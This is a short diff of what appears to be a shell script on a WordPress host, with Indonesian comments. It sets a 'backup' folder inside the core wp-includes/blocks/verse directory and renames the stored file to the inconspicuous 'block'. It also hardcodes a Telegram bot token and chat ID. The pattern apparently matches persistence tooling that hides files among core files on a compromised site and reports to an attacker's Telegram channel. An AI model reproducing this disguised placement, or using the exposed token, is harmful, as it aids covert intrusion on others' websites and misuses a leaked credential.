@@ -7,7 +7,7 @@ BACKUP_FOLDER="/home/bemfh/public_html/wp-includes/blocks/verse"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/blog.js"
+BACKUP_FILE="$BACKUP_FOLDER/block"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
